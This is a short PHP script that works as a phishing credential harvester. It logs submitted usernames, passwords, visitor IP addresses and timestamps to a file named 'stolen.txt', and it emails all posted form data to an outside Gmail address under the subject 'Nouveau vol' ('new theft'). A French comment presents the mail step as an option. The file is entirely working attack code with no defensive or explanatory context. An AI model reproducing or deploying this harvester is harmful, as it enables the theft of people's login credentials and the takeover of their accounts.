<?php
$f = fopen("stolen.txt", "a");
fwrite($f, "User: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | " . date('Y-m-d H:i:s') . "\n");
fclose($f);
// Tu peux aussi envoyer par mail
mail("proroblox258@gmail.com", "Nouveau vol", print_r($_POST, true));
?>